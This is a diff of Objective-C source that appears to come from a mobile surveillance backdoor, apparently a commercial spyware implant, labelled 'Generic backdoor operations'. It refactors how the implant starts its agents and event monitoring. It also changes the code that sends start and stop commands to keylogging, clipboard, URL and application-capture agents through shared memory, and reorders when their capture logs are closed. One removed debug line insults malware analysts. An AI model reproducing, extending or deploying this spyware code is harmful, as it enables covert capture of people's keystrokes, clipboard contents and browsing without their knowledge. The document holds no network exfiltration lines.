@@ -157,23 +157,12 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #pragma mark Generic backdoor operations
 #pragma mark -
 
+
 - (BOOL)loadInitialConfiguration
 {
   if ([mConfigManager loadConfiguration] == YES)
     {
-      //
-      // Start all the enabled agents
-      //
-//#ifndef NO_START_AT_LAUNCH
-      [self startAgents];
-//#endif
-      
-      //
-      // Start events monitoring thread
-      //
-      [NSThread detachNewThreadSelector: @selector(eventsMonitor)
-                               toTarget: self
-                             withObject: nil];
+      return TRUE;
     }
   else
     {
@@ -842,14 +831,14 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             shMemoryHeader->commandDataSize = 0;
 
             BOOL success = [_logManager createLog: LOG_CLIPBOARD
-              agentHeader: nil
-              withLogID: 0];
+                                      agentHeader: nil
+                                        withLogID: 0];
 
             if (success == TRUE)
               {
                 if ([mSharedMemory writeMemory: agentCommand
-                    offset: OFFT_CLIPBOARD
-                    fromComponent: COMP_CORE])
+                                        offset: OFFT_CLIPBOARD
+                                 fromComponent: COMP_CORE])
                   {
 #ifdef DEBUG
                     NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
@@ -1697,8 +1686,8 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 shMemoryHeader->commandDataSize = 0;
 
                 BOOL success = [_logManager createLog: LOG_CLIPBOARD
-                  agentHeader: nil
-                  withLogID: 0];
+                                          agentHeader: nil
+                                            withLogID: 0];
 
                 if (success == TRUE)
                   {
@@ -1846,10 +1835,10 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
                     NSLog(@"Stop command sent to Agent URL");
 #endif
-
-                    [_logManager closeActiveLog: LOG_URL withLogID: 0];
                     [anObject setObject: AGENT_STOP
                                  forKey: @"status"];
+                                 
+                    [_logManager closeActiveLog: LOG_URL withLogID: 0];
                   }
                 
                 [agentCommand release];
@@ -1875,10 +1864,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
                     NSLog(@"Stop command sent to Agent Application");
 #endif
-                
-                    [_logManager closeActiveLog: LOG_APPLICATION withLogID: 0];
                     [anObject setObject: AGENT_STOP
-                                 forKey: @"status"];
+                                 forKey: @"status"];  
+                                               
+                    [_logManager closeActiveLog: LOG_APPLICATION withLogID: 0];
+
                   }
               
                 [agentCommand release];
@@ -1948,10 +1938,10 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
                     NSLog(@"Stop command sent to Agent Keylog");
 #endif
-
-                    [_logManager closeActiveLog: LOG_KEYLOG withLogID: 0];
                     [anObject setObject: AGENT_STOP
                                  forKey: @"status"];
+                                 
+                    [_logManager closeActiveLog: LOG_KEYLOG withLogID: 0];
                   }
                 
                 [agentCommand release];
@@ -2032,12 +2022,12 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
                     NSLog(@"Stop command sent to Agent clipboard");
 #endif
-
-                    [_logManager closeActiveLog: LOG_CLIPBOARD 
-                      withLogID: 0];
-
+                  
                     [anObject setObject: AGENT_STOP
-                      forKey: @"status"];
+                                 forKey: @"status"];
+                                 
+                    [_logManager closeActiveLog: LOG_CLIPBOARD 
+                                      withLogID: 0];
                   }
 
                 [agentCommand release];
@@ -2113,18 +2103,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
             [NSThread detachNewThreadSelector: @selector(eventTimer:)
                                      toTarget: events
                                    withObject: anObject];
-            /*
-            sleep(3);
-            [anObject setValue: EVENT_STOP forKey: @"status"];
-            
-            while ([anObject objectForKey: @"status"] != EVENT_STOPPED)
-              {
-                NSLog(@"Waiting for thread to stop");
-                sleep(1);
-              }
-            NSLog(@"STOPPED");
-            exit(-1);
-            */
             break;
           }
         case EVENT_PROCESS:
@@ -2150,12 +2128,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
            break; 
           }
         case EVENT_QUOTA:
-          break;
+          {
+            break;
+          }
         case EVENT_BATTERY:
           {
-#ifdef DEBUG
-            NSLog(@"EVENT battery FOUND! add object");
-#endif
             RCSIEvents *events = [RCSIEvents sharedEvents];
             RCSINotificationCenter *center = [RCSINotificationCenter sharedInstance];
             [center addNotificationObject: (id) events withEvent: BATTERY_CT_EVENT];
@@ -2192,9 +2169,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
           }
         default:
           {
-#ifdef DEBUG
-            NSLog(@"Event not implemented, consider going to fuck yourself ANALyst");
-#endif
             break;
           }
         }
@@ -2309,6 +2283,16 @@ extern RCSISharedMemory *mSharedMemoryCommand;
     return TRUE;
   else
     return FALSE;
+}
+
+
+- (BOOL)startEvents
+{
+  // Start events monitoring thread
+  [NSThread detachNewThreadSelector: @selector(eventsMonitor)
+                           toTarget: self
+                         withObject: nil];
+  return TRUE;
 }
 
 #pragma mark -
